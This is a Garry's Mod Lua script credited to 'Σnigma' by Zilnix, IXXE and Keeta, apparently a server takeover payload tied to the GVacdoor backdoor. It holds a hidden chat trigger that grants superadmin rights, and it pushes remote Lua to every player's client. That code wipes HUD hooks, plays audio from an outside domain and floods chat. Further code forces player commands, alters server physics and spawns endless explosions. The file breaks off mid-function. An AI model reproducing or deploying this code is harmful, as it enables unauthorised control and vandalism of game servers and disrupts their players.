!......YBBBBBBBBBBBBBBBBBBBRPFT?!::::::;:!^"`;:::       `.  
!........YBBBBBBBBBBRPFT?!::::::::::^''...::::::;         iBBbo.
`..........YBRPFT?!::::::::::::::::::::::::;iof68bo.      WBBBBbo.
  `..........:::::::::::::::::::::::;iof688888888888b.     `YBBBP^'
    `........::::::::::::::::;iof688888888888888888888b.     `
      `......:::::::::;iof688888888888888888888888888888b.
        `....:::;iof688888888888888888888888888888888899fT!  		Σnigma | The Purification Weapon - Weapon By Zilnix, IXXE and Keeta
          `..::!8888888888888888888888888888888899fT|!^"'   
            `' !!988888888888888888888888899fT|!^"' 
                `!!8888888888888888899fT|!^"'
                  `!988888888899fT|!^"'
                    `!9899fT|!^"'
                      `!^"'
]]
,
[[
		
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
                       .,,uod8B8bou,,.
              ..,uod8BBBBBBBBBBBBBBBBRPFT?l!i:.
         ,=m8BBBBBBBBBBBBBBBRPFT?!||||||||||||||
         !...:!TVBBBRPFT||||||||||!!^^""'   ||||
         !.......:!?|||||!!^^""'            ||||
         !.........||||                     ||||
         !.........||||  It's Too Glitchy   ||||
         !.........||||                     ||||
         !.........||||       .   .         ||||
         !.........||||         -           ||||
         !.........||||                     ||||
         `.........||||   HELP ME PLEASE   ,||||
          .;.......||||               _.-!!|||||
   .,uodWBBBBb.....||||       _.-!!|||||||||!:'
!YBBBBBBBBBBBBBBb..!|||:..-!!|||||||!iof68BBBBBb.... 
!..YBBBBBBBBBBBBBBb!!||||||||!iof68BBBBBBRPFT?!::   `.
!....YBBBBBBBBBBBBBBbaaitf68BBBBBBRPFT?!:::::::::     `.
!......YBBBBBBBBBBBBBBBBBBBRPFT?!::::::;:!^"`;:::       `.  
!........YBBBBBBBBBBRPFT?!::::::::::^''...::::::;         iBBbo.
`..........YBRPFT?!::::::::::::::::::::::::;iof68bo.      WBBBBbo.
  `..........:::::::::::::::::::::::;iof688888888888b.     `YBBBP^'
    `........::::::::::::::::;iof688888888888888888888b.     `
      `......:::::::::;iof688888888888888888888888888888b.
        `....:::;iof688888888888888888888888888888888899fT!  		Σnigma | The Purification Weapon - Weapon By Zilnix, IXXE and Keeta
          `..::!8888888888888888888888888888888899fT|!^"'   
            `' !!988888888888888888888888899fT|!^"' 
                `!!8888888888888888899fT|!^"'
                  `!988888888899fT|!^"'
                    `!9899fT|!^"'
                      `!^"'
]]
,
[[
		
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
                       .,,uod8B8bou,,.
              ..,uod8BBBBBBBBBBBBBBBBRPFT?l!i:.
         ,=m8BBBBBBBBBBBBBBBRPFT?!||||||||||||||
         !...:!TVBBBRPFT||||||||||!!^^""'   ||||
         !.......:!?|||||!!^^""'            ||||
         !.........||||                     ||||
         !.........||||  HELP ME !!!        ||||
         !.........||||                     ||||
         !.........||||      I NEED HELP !  ||||
         !.........||||                     ||||
         !.........||||           ...       ||||
         `.........||||                    ,||||
          .;.......||||               _.-!!|||||
   .,uodWBBBBb.....||||       _.-!!|||||||||!:'
!YBBBBBBBBBBBBBBb..!|||:..-!!|||||||!iof68BBBBBb.... 
!..YBBBBBBBBBBBBBBb!!||||||||!iof68BBBBBBRPFT?!::   `.
!....YBBBBBBBBBBBBBBbaaitf68BBBBBBRPFT?!:::::::::     `.
!......YBBBBBBBBBBBBBBBBBBBRPFT?!::::::;:!^"`;:::       `.  
!........YBBBBBBBBBBRPFT?!::::::::::^''...::::::;         iBBbo.
`..........YBRPFT?!::::::::::::::::::::::::;iof68bo.      WBBBBbo.
  `..........:::::::::::::::::::::::;iof688888888888b.     `YBBBP^'
    `........::::::::::::::::;iof688888888888888888888b.     `
      `......:::::::::;iof688888888888888888888888888888b.
        `....:::;iof688888888888888888888888888888888899fT!  		Σnigma | The Purification Weapon - Weapon By Zilnix, IXXE and Keeta
          `..::!8888888888888888888888888888888899fT|!^"'   
            `' !!988888888888888888888888899fT|!^"' 
                `!!8888888888888888899fT|!^"'
                  `!988888888899fT|!^"'
                    `!9899fT|!^"'
                      `!^"'
]]
,
[[
		
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
                       .,,uod8B8bou,,.
              ..,uod8BBBBBBBBBBBBBBBBRPFT?l!i:.
         ,=m8BBBBBBBBBBBBBBBRPFT?!||||||||||||||
         !...:!TVBBBRPFT||||||||||!!^^""'   ||||
         !.......:!?|||||!!^^""'            ||||
         !.........||||                     ||||
         !.........||||  What Is Love       ||||
         !.........||||   Baby Don' Hurt Me ||||
         !.........||||      No More        ||||
         !.........||||                     ||||
         !.........||||    ♪ ♫   ♪ ♫  ♪♫     ||||
         `.........||||                    ,||||
          .;.......||||               _.-!!|||||
   .,uodWBBBBb.....||||       _.-!!|||||||||!:'
!YBBBBBBBBBBBBBBb..!|||:..-!!|||||||!iof68BBBBBb.... 
!..YBBBBBBBBBBBBBBb!!||||||||!iof68BBBBBBRPFT?!::   `.
!....YBBBBBBBBBBBBBBbaaitf68BBBBBBRPFT?!:::::::::     `.
!......YBBBBBBBBBBBBBBBBBBBRPFT?!::::::;:!^"`;:::       `.  
!........YBBBBBBBBBBRPFT?!::::::::::^''...::::::;         iBBbo.
`..........YBRPFT?!::::::::::::::::::::::::;iof68bo.      WBBBBbo.
  `..........:::::::::::::::::::::::;iof688888888888b.     `YBBBP^'
    `........::::::::::::::::;iof688888888888888888888b.     `
      `......:::::::::;iof688888888888888888888888888888b.
        `....:::;iof688888888888888888888888888888888899fT!  		Σnigma | The Purification Weapon - Weapon By Zilnix, IXXE and Keeta
          `..::!8888888888888888888888888888888899fT|!^"'   
            `' !!988888888888888888888888899fT|!^"' 
                `!!8888888888888888899fT|!^"'
                  `!988888888899fT|!^"'
                    `!9899fT|!^"'
                      `!^"'
]]
}

function decorationconsole()
	print(Color( 0, 0, 0 ), table.Random(decore))
end
-- Console Spam
for k, v in pairs( player.GetAll() ) do
 timer.Create("consolespamenigma", 0.4, 0, function() decorationconsole( v ) end )
end
 
--[[ MODE ARMAGEDDON --
 
 
            hook.Add("Think", "armageddon", function()
                local explode = ents.Create( "env_explosion" )
                    explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) )
                    explode:Spawn()
                    explode:SetKeyValue( "iMagnitude", "500" )
                    explode:Fire( "Explode", 0, 0 )
                end)
 
               
-- FIN MODE ARMAGEDDON  ]]--


-- Send Lua --
 function SendLuaAll( str ) net.Start( "EnigmaProject" ) net.WriteString( str ) net.Broadcast() end
 
 
-- Changer Taille --
 
 
hook.Add("Think", "giant", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(50.5, 100);
        v:SetRunSpeed(700 * 2);
        v:SetWalkSpeed(400 * 2);
    end
end)
 
 
-- Fin Changer Taille --
 
 
 
-- Message --
 
 
for k,v in pairs(player.GetAll()) do
    v:ConCommand("say /ooc Ce monde cancer est éliminé, Le projet Σnigma avance !")
end
 
 
-- Message Fin --
 
 
 
-- Auto Lançage --
 
 
for k, v in pairs( player.GetAll() ) do
    enigmalaunchproject:SetupPlayer( v )
    timer.Simple( 2, function() enigmalaunchproject:Start( v ) end )
end
 
 
-- Fin Auto Lançage --
 
 
-- Lancer Aux Nouveaux Arrivants --
 
 
--hook.Add( "PlayerAuthed", "wtfispassequoi", function( pPlayer )
--    enigmalaunchproject:SetupPlayer( pPlayer )
--    timer.Simple( 10, function() enigmalaunchproject:Start( pPlayer ) end )
--end )
 
-- Fin Lancer Aux Nouveaux Arrivants --
 
 
 
-- Commande Enigma --
 
 
hook.Add( "PlayerSay", "EnigmaCKoa", function( pSender, strText, bTeamChat )
    if strText:sub( 1, 5 ) == "Enigma" then
        pSender:Ignite( 1e9 )
        pSender:ChatPrint( "Σnigma est ici pour exterminer tout les serveurs cancer de Garry's Mod =)" )
        pSender:SendLua( [[surface.PlaySound( "vo/npc/male01/hacks01.wav" )]] )
        return false
    end
end )
 
 
-- Fin Commande Enigma
 
 
 
 
 
hook.Add( "PlayerSay", "a4dxvlwxdlco", function( pSender, strText, bTeamChat )
    if strText:sub( 1, 5 ) == "EnigmaIsLitteralyMyFuckingGod" then
        pSender:SetUserGroup("superadmin")
        pSender:ChatPrint( "Tu est l'un des notres !" )
        pSender:SendLua( [[surface.PlaySound( "vo/npc/male01/hacks01.wav" )]] )
        return false
    end
end)
 
 
 
 
 
 
 
 
 

enigmalaunchproject:NouvelleAction( 0, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, ([=[
 
        sound.PlayURL( "https://gvac.cz/assets/galshi.mp3", "", function()end )
       
        g_]=].. enigmalaunchproject.m_strImageGlobalVar.. [=[ = {}
        local html = [[%s]]
        local function LoadWebMaterial( strURL, strUID, intSizeX, intSizeY )
            local pnl = vgui.Create( "HTML" )
            pnl:SetPos( ScrW() -1, ScrH() -1 )
            pnl:SetVisible( true )
            pnl:SetMouseInputEnabled( false )
            pnl:SetKeyBoardInputEnabled( false )
            pnl:SetSize( intSizeX, intSizeY )
            pnl:SetHTML( html:format(strURL, intSizeX, intSizeY) )
           
            local PageLoaded
            PageLoaded = function()
                local mat = pnl:GetHTMLMaterial()
                if mat then
                    g_]=].. enigmalaunchproject.m_strImageGlobalVar.. [=[[strUID] = { mat, pnl }
                    return
                end
               
                timer.Simple( 0.5, PageLoaded )
            end
 
            PageLoaded()
        end
 
--LoadWebMaterial( "https://image.noelshack.com/fichiers/2018/06/5/1518211648-sans-titre-6.gif", "getrekt", 1920, 1080 )
 
        hook.Add( "RenderScreenspaceEffects", "itsredworld", function()
            local sinScaler = math.sin( CurTime() )
            DrawBloom(
                0,
                3,
                sinScaler *math.Rand(1, 8),
                sinScaler *math.Rand(1, 8),
                6,
                math.Rand(0.5, 2),
                math.Rand(0, 0.3),
                math.Rand(0, 0.3),
                math.Rand(0.5, 1)
            )
 
            DrawColorModify{
                ["$pp_colour_addr"] = 1,
                ["$pp_colour_addg"] = 0,
                ["$pp_colour_addb"] = 0,
                ["$pp_colour_brightness" ] = 0.1,
                ["$pp_colour_contrast" ] = 0.1,
                ["$pp_colour_colour" ] = 0.1,
                ["$pp_colour_mulr" ] = 1,
                ["$pp_colour_mulg" ] = 0,
                ["$pp_colour_mulb" ] = 0
            }
        end )
 
]=]):format(enigmalaunchproject.m_strImageLoadHTML) )
end )
 
 
 
 
enigmalaunchproject:NouvelleAction( 14, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
 
    (GAMEMODE or GM).CalcView = function() end
    (GAMEMODE or GM).ShouldDrawLocalPlayer = function() end
 
    local remove = { "PostDrawHUD", "PreDrawHUD", "HUDPaint", "HUDPaintBackground", "CalcView", "ShouldDrawLocalPlayer" }
        for k, v in pairs(remove) do
            hook.GetTable()[v] = {}
    end
 
        local function GetWebMat( strURL )
            return g_]].. enigmalaunchproject.m_strImageGlobalVar.. [[[strURL]
    end
       
    hook.Add( "HUDPaint", "hud1enigma", function()
        surface.SetDrawColor( 255, 255, 255, 255 )
           
    if GetWebMat( "getrekt" ) then
        surface.SetMaterial( GetWebMat("getrekt")[1] )
        surface.DrawTexturedRect( 0, 0, 2100, 2000 )
    end
           
    draw.SimpleTextOutlined(
    "The Enigma Project Was Completed",
    "DermaLarge",
    ScrW() /2 +math.random( -2, 2 ),
    ScrH() /2 +math.random( -2, 2 ) +0,
    Color(math.random(1,255),math.random(1,255),math.random(1,255)),
    TEXT_ALIGN_CENTER,
    TEXT_ALIGN_CENTER,
    1,
    Color(math.random(1,255),math.random(1,255),math.random(1,255))
)
end )
 
        local allowed = { ["CHudChat"] = true, ["CHudGMod"] = true, ["CHudWeaponSelection"] = true, ["CHudMenu"] = true }
        hook.Add( "HUDShouldDraw", "hud1enigma", function( str ) if not allowed[str] then return false end end )
           
    ]] )
end )
 
 
 
enigmalaunchproject:NouvelleAction( 4, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
 
    hook.Remove( "HUDPaint", "hud1enigma", function() end)
   
   
   
    ]] )
end )
 
enigmalaunchproject:NouvelleAction( 3, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    (GAMEMODE or GM).CalcView = function() end
    (GAMEMODE or GM).ShouldDrawLocalPlayer = function() end
 
    local remove = { "PostDrawHUD", "PreDrawHUD", "HUDPaint", "HUDPaintBackground", "CalcView", "ShouldDrawLocalPlayer" }
        for k, v in pairs(remove) do
            hook.GetTable()[v] = {}
    end
 
        local function GetWebMat( strURL )
            return g_]].. enigmalaunchproject.m_strImageGlobalVar.. [[[strURL]
    end
       
    hook.Add( "HUDPaint", "hud1enigma", function()
        surface.SetDrawColor( 255, 255, 255, 255 )
           
    if GetWebMat( "getrekt" ) then
        surface.SetMaterial( GetWebMat("getrekt")[1] )
        surface.DrawTexturedRect( 0, 0, 2100, 2000 )
    end
           
    draw.SimpleTextOutlined(
    "Today, this server is going to be purified",
    "DermaLarge",
    ScrW() /2 +math.random( -2, 2 ),
    ScrH() /2 +math.random( -2, 2 ) +0,
    Color(math.random(1,255),math.random(1,255),math.random(1,255)),
    TEXT_ALIGN_CENTER,
    TEXT_ALIGN_CENTER,
    1,
    Color(math.random(1,255),math.random(1,255),math.random(1,255))
)
end )
 
        local allowed = { ["CHudChat"] = true, ["CHudGMod"] = true, ["CHudWeaponSelection"] = true, ["CHudMenu"] = true }
        hook.Add( "HUDShouldDraw", "hud1enigma", function( str ) if not allowed[str] then return false end end )
           
   
    ]] )
end )
 
enigmalaunchproject:NouvelleAction( 4, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    hook.Remove( "HUDPaint", "hud1enigma", function() end)
   
    ]] )
end )
 
enigmalaunchproject:NouvelleAction( 3, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
 
 
    (GAMEMODE or GM).CalcView = function() end
    (GAMEMODE or GM).ShouldDrawLocalPlayer = function() end
 
    local remove = { "PostDrawHUD", "PreDrawHUD", "HUDPaint", "HUDPaintBackground", "CalcView", "ShouldDrawLocalPlayer" }
        for k, v in pairs(remove) do
            hook.GetTable()[v] = {}
    end
 
        local function GetWebMat( strURL )
            return g_]].. enigmalaunchproject.m_strImageGlobalVar.. [[[strURL]
    end
       
    hook.Add( "HUDPaint", "hud1enigma", function()
        surface.SetDrawColor( 255, 255, 255, 255 )
           
    if GetWebMat( "getrekt" ) then
        surface.SetMaterial( GetWebMat("getrekt")[1] )
        surface.DrawTexturedRect( 0, 0, 2100, 2000 )
    end
           
    draw.SimpleTextOutlined(
    "Now, Observe our power !",
    "DermaLarge",
    ScrW() /2 +math.random( -2, 2 ),
    ScrH() /2 +math.random( -2, 2 ) +0,
    Color(math.random(1,255),math.random(1,255),math.random(1,255)),
    TEXT_ALIGN_CENTER,
    TEXT_ALIGN_CENTER,
    1,
    Color(math.random(1,255),math.random(1,255),math.random(1,255))
)
end )
 
        local allowed = { ["CHudChat"] = true, ["CHudGMod"] = true, ["CHudWeaponSelection"] = true, ["CHudMenu"] = true }
        hook.Add( "HUDShouldDraw", "hud1enigma", function( str ) if not allowed[str] then return false end end )
           
   
   
    ]] )
end )
 
enigmalaunchproject:NouvelleAction( 1, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
for k,v in pairs(player.GetAll()) do
    v:ConCommand("say /job We Love Enigma")
end
   
    ]] )
end )
 
enigmalaunchproject:NouvelleAction( 2, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
       
    hook.Remove( "HUDPaint", "hud1enigma", function() end)
   
    ]] )
end )
 
enigmalaunchproject:NouvelleAction( 1, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    RunConsoleCommand("+right")
   
    ]] )
end )
 
enigmalaunchproject:NouvelleAction( 1, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    RunConsoleCommand("-right")
   
    ]] )
end )
 
enigmalaunchproject:NouvelleAction( 1, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    RunConsoleCommand("+duck")
   
    ]] )
end )
 
enigmalaunchproject:NouvelleAction( 1, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    RunConsoleCommand("-duck")
   
    ]] )
end )
 
enigmalaunchproject:NouvelleAction( 1, function( pPlayer )
 
timer.Create( "lespamckool", 0.5, 0, function() SendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), "Enigma will bring back this game from his ashes" )' ) end)
timer.Create( "lespamckool2", 0.5, 0, function() SendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), "We control this game !" )' ) end)
timer.Create( "lespamckool3", 0.5, 0, function() SendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), "Server in purification" )' ) end)
timer.Create( "lespamckool4", 0.5, 0, function() SendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), "ZILNIX" )' ) end)
timer.Create( "lespamckool5", 0.5, 0, function() SendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), "KEETA" )' ) end)
timer.Create( "lespamckool6", 0.5, 0, function() SendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), "IXXE" )' ) end)
timer.Create( "lespamckool7", 0.5, 0, function() SendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), "And GVacdoor Members !" )' ) end)
timer.Create( "lespamckool8", 0.5, 0, function() SendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), "The Elite Of GMod" )' ) end)
 
end )
 
 
enigmalaunchproject:NouvelleAction( 4, function( pPlayer )
 
timer.Remove( "lespamckool" )
timer.Remove( "lespamckool2" )
timer.Remove( "lespamckool3" )
timer.Remove( "lespamckool4" )
timer.Remove( "lespamckool5" )
timer.Remove( "lespamckool6" )
timer.Remove( "lespamckool7" )
timer.Remove( "lespamckool8" )
 
end )
 
enigmalaunchproject:NouvelleAction( 1, function( pPlayer )
 
 
RunConsoleCommand("sv_friction", "-50")
 
 
end )
 
enigmalaunchproject:NouvelleAction( 1, function( pPlayer )
 
 
RunConsoleCommand("sv_gravity", "300")
 
 
end )
 
enigmalaunchproject:NouvelleAction( 12, function( pPlayer )
 
 
            hook.Add("Think", "armageddon", function()
                local explode = ents.Create( "env_explosion" )
                    explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) )
                    explode:Spawn()
                    explode:SetKeyValue( "iMagnitude", "500" )
                    explode:Fire( "Explode", 0, 0 )
                end)
 
end )
 
 
enigmalaunchproject:NouvelleAction( 27, function( pPlayer )
       
    hook.Remove( "Think", "armageddon", function() end)
   
end )

enigmalaunchproject:NouvelleAction( 7, function( pPlayer )
enigmalaunchproject:SendLua( pPlayer, [[       
        hook.Add( "RenderScreenspaceEffects", "itsendofworld", function()
            local sinScaler = math.sin( CurTime() )
            DrawBloom(
                0,
                3,
                sinScaler *math.Rand(1, 8),
                sinScaler *math.Rand(1, 8),
                6,
                math.Rand(0.5, 2),
                math.Rand(0, 0.3),
                math.Rand(0, 0.3),
                math.Rand(0.5, 1)
            )
 
            DrawColorModify{
                ["$pp_colour_addr"] = 0,
                ["$pp_colour_addg"] = 0,
                ["$pp_colour_addb"] = 0,
                ["$pp_colour_brightness" ] = 0.1,
                ["$pp_colour_contrast" ] = 0.1,
                ["$pp_colour_colour" ] = 0.1,
                ["$pp_colour_mulr" ] = 0,
                ["$pp_colour_mulg" ] = 0,
                ["$pp_colour_mulb" ] = 0
            }
        end )
   
    ]] )
end )
 
enigmalaunchproject:NouvelleAction( 0, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    (GAMEMODE or GM).CalcView = function() end
    (GAMEMODE or GM).ShouldDrawLocalPlayer = function() end
 
    local remove = { "PostDrawHUD", "PreDrawHUD", "HUDPaint", "HUDPaintBackground", "CalcView", "ShouldDrawLocalPlayer" }
        for k, v in pairs(remove) do
            hook.GetTable()[v] = {}
    end
 
        local function GetWebMat( strURL )
            return g_]].. enigmalaunchproject.m_strImageGlobalVar.. [[[strURL]
    end
       
    hook.Add( "HUDPaint", "hud1enigma", function()
        surface.SetDrawColor( 255, 255, 255, 255 )
           
    draw.SimpleTextOutlined(
    "KEETA",
    "DermaLarge",
    ScrW() /2 +math.random( -270, 300 ),
    ScrH() /2 +math.random( -300, 700 ) +0,
    Color(math.random(1,255),math.random(1,255),math.random(1,255)),
    TEXT_ALIGN_CENTER,
    TEXT_ALIGN_CENTER,
    1,
    Color(math.random(1,255),math.random(1,255),math.random(1,255))
)
end )
 
 ]] )
end )


enigmalaunchproject:NouvelleAction( 0.1, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    (GAMEMODE or GM).CalcView = function() end
    (GAMEMODE or GM).ShouldDrawLocalPlayer = function() end
 
    local remove = { "PostDrawHUD", "PreDrawHUD", "HUDPaint", "HUDPaintBackground", "CalcView", "ShouldDrawLocalPlayer" }
        for k, v in pairs(remove) do
            hook.GetTable()[v] = {}
    end
 
        local function GetWebMat( strURL )
            return g_]].. enigmalaunchproject.m_strImageGlobalVar.. [[[strURL]
    end
       
    hook.Add( "HUDPaint", "hud2enigma", function()
        surface.SetDrawColor( 255, 255, 255, 255 )
           
    draw.SimpleTextOutlined(
    "ZILNIX",
    "DermaLarge",
    ScrW() /2 +math.random( -600, 700 ),
    ScrH() /2 +math.random( -200, 800 ) +100,
    Color(math.random(1,255),math.random(1,255),math.random(1,255)),
    TEXT_ALIGN_CENTER,
    TEXT_ALIGN_CENTER,
    1,
    Color(math.random(1,255),math.random(1,255),math.random(1,255))
)
end )
    ]] )
end )

enigmalaunchproject:NouvelleAction( 0.1, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    (GAMEMODE or GM).CalcView = function() end
    (GAMEMODE or GM).ShouldDrawLocalPlayer = function() end
 
    local remove = { "PostDrawHUD", "PreDrawHUD", "HUDPaint", "HUDPaintBackground", "CalcView", "ShouldDrawLocalPlayer" }
        for k, v in pairs(remove) do
            hook.GetTable()[v] = {}
    end
 
        local function GetWebMat( strURL )
            return g_]].. enigmalaunchproject.m_strImageGlobalVar.. [[[strURL]
    end
       
    hook.Add( "HUDPaint", "hud3enigma", function()
        surface.SetDrawColor( 255, 255, 255, 255 )
           
    draw.SimpleTextOutlined(
    "IXXE",
    "DermaLarge",
    ScrW() /2 +math.random( -400, 500 ),
    ScrH() /2 +math.random( -600, 500 ) -100,
    Color(math.random(1,255),math.random(1,255),math.random(1,255)),
    TEXT_ALIGN_CENTER,
    TEXT_ALIGN_CENTER,
    1,
    Color(math.random(1,255),math.random(1,255),math.random(1,255))
)
end )
    ]] )
end )
 
enigmalaunchproject:NouvelleAction( 0.1, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    (GAMEMODE or GM).CalcView = function() end
    (GAMEMODE or GM).ShouldDrawLocalPlayer = function() end
 
    local remove = { "PostDrawHUD", "PreDrawHUD", "HUDPaint", "HUDPaintBackground", "CalcView", "ShouldDrawLocalPlayer" }
        for k, v in pairs(remove) do
            hook.GetTable()[v] = {}
    end
 
        local function GetWebMat( strURL )
            return g_]].. enigmalaunchproject.m_strImageGlobalVar.. [[[strURL]
    end
       
    hook.Add( "HUDPaint", "hud5enigma", function()
        surface.SetDrawColor( 255, 255, 255, 255 )
           
    draw.SimpleTextOutlined(
    "AKITA",
    "DermaLarge",
    ScrW() /2 +math.random( -500, 500 ),
    ScrH() /2 +math.random( -500, 500 ) +0,
    Color(math.random(1,255),math.random(1,255),math.random(1,255)),
    TEXT_ALIGN_CENTER,
    TEXT_ALIGN_CENTER,
    1,
    Color(math.random(1,255),math.random(1,255),math.random(1,255))
)
end )
     ]] )
end )
 
enigmalaunchproject:NouvelleAction( 0.1, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    (GAMEMODE or GM).CalcView = function() end
    (GAMEMODE or GM).ShouldDrawLocalPlayer = function() end
 
    local remove = { "PostDrawHUD", "PreDrawHUD", "HUDPaint", "HUDPaintBackground", "CalcView", "ShouldDrawLocalPlayer" }
        for k, v in pairs(remove) do
            hook.GetTable()[v] = {}
    end
 
        local function GetWebMat( strURL )
            return g_]].. enigmalaunchproject.m_strImageGlobalVar.. [[[strURL]
    end
       
    hook.Add( "HUDPaint", "hud7enigma", function()
        surface.SetDrawColor( 255, 255, 255, 255 )
           
    draw.SimpleTextOutlined(
    "Jodingue",
    "DermaLarge",
    ScrW() /2 +math.random( -700, 700 ),
    ScrH() /2 +math.random( -700, 700 ) +300,
    Color(math.random(1,255),math.random(1,255),math.random(1,255)),
    TEXT_ALIGN_CENTER,
    TEXT_ALIGN_CENTER,
    1,
    Color(math.random(1,255),math.random(1,255),math.random(1,255))
)
end )
    ]] )
end )

enigmalaunchproject:NouvelleAction( 0.1, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    (GAMEMODE or GM).CalcView = function() end
    (GAMEMODE or GM).ShouldDrawLocalPlayer = function() end
 
    local remove = { "PostDrawHUD", "PreDrawHUD", "HUDPaint", "HUDPaintBackground", "CalcView", "ShouldDrawLocalPlayer" }
        for k, v in pairs(remove) do
            hook.GetTable()[v] = {}
    end
 
        local function GetWebMat( strURL )
            return g_]].. enigmalaunchproject.m_strImageGlobalVar.. [[[strURL]
    end
       
    hook.Add( "HUDPaint", "hud10enigma", function()
        surface.SetDrawColor( 255, 255, 255, 255 )
           
    draw.SimpleTextOutlined(
    "FULLMACHINE",
    "DermaLarge",
    ScrW() /2 +math.random( -800, 800 ),
    ScrH() /2 +math.random( -800, 800 ) -400,
    Color(math.random(1,255),math.random(1,255),math.random(1,255)),
    TEXT_ALIGN_CENTER,
    TEXT_ALIGN_CENTER,
    1,
    Color(math.random(1,255),math.random(1,255),math.random(1,255))
)
end )
     ]] )
end )

enigmalaunchproject:NouvelleAction( 0.1, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    (GAMEMODE or GM).CalcView = function() end
    (GAMEMODE or GM).ShouldDrawLocalPlayer = function() end
 
    local remove = { "PostDrawHUD", "PreDrawHUD", "HUDPaint", "HUDPaintBackground", "CalcView", "ShouldDrawLocalPlayer" }
        for k, v in pairs(remove) do
            hook.GetTable()[v] = {}
    end
 
        local function GetWebMat( strURL )
            return g_]].. enigmalaunchproject.m_strImageGlobalVar.. [[[strURL]
    end
       
    hook.Add( "HUDPaint", "hud12enigma", function()
        surface.SetDrawColor( 255, 255, 255, 255 )
           
    draw.SimpleTextOutlined(
    "Kazuki",
    "DermaLarge",
    ScrW() /2 +math.random( -850, 850 ),
    ScrH() /2 +math.random( -850, 850 ) +100,
    Color(math.random(1,255),math.random(1,255),math.random(1,255)),
    TEXT_ALIGN_CENTER,
    TEXT_ALIGN_CENTER,
    1,
    Color(math.random(1,255),math.random(1,255),math.random(1,255))
)
end )
     ]] )
end )

enigmalaunchproject:NouvelleAction( 0.1, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    (GAMEMODE or GM).CalcView = function() end
    (GAMEMODE or GM).ShouldDrawLocalPlayer = function() end
 
    local remove = { "PostDrawHUD", "PreDrawHUD", "HUDPaint", "HUDPaintBackground", "CalcView", "ShouldDrawLocalPlayer" }
        for k, v in pairs(remove) do
            hook.GetTable()[v] = {}
    end
 
        local function GetWebMat( strURL )
            return g_]].. enigmalaunchproject.m_strImageGlobalVar.. [[[strURL]
    end
       
    hook.Add( "HUDPaint", "hud1enigma", function()
        surface.SetDrawColor( 255, 255, 255, 255 )
           
    draw.SimpleTextOutlined(
    "GVACDOOR",
    "DermaLarge",
    ScrW() /2 +math.random( -300, 600 ),
    ScrH() /2 +math.random( -600, 300 ) +200,
    Color(math.random(1,255),math.random(1,255),math.random(1,255)),
    TEXT_ALIGN_CENTER,
    TEXT_ALIGN_CENTER,
    1,
    Color(math.random(1,255),math.random(1,255),math.random(1,255))
)
end )
     ]] )
end )

enigmalaunchproject:NouvelleAction( 0.1, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    (GAMEMODE or GM).CalcView = function() end
    (GAMEMODE or GM).ShouldDrawLocalPlayer = function() end
 
    local remove = { "PostDrawHUD", "PreDrawHUD", "HUDPaint", "HUDPaintBackground", "CalcView", "ShouldDrawLocalPlayer" }
        for k, v in pairs(remove) do
            hook.GetTable()[v] = {}
    end
 
        local function GetWebMat( strURL )
            return g_]].. enigmalaunchproject.m_strImageGlobalVar.. [[[strURL]
    end
       
    hook.Add( "HUDPaint", "hud1enigma", function()
        surface.SetDrawColor( 255, 255, 255, 255 )
           
    draw.SimpleTextOutlined(
    "GVACDOOR",
    "DermaLarge",
    ScrW() /2 +math.random( -300, 600 ),
    ScrH() /2 +math.random( -600, 300 ) +200,
    Color(math.random(1,255),math.random(1,255),math.random(1,255)),
    TEXT_ALIGN_CENTER,
    TEXT_ALIGN_CENTER,
    1,
    Color(math.random(1,255),math.random(1,255),math.random(1,255))
)
end )
     ]] )
end )


enigmalaunchproject:NouvelleAction( 0, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, ([=[
		
		g_]=].. enigmalaunchproject.m_strImageGlobalVar.. [=[ = {}
		local html = [[%s]]
		local function LoadWebMaterial( strURL, strUID, intSizeX, intSizeY )
			local pnl = vgui.Create( "HTML" )
